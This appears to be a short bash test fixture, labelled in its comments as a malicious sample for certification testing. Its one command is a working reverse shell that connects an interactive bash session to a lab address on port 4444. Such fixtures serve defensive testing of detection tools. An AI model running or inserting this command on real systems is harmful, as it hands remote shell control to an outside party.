#!/bin/bash
# MALICIOUS TEST SAMPLE - Reverse Shell
# This is a TEST file for certification - DO NOT execute in production
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
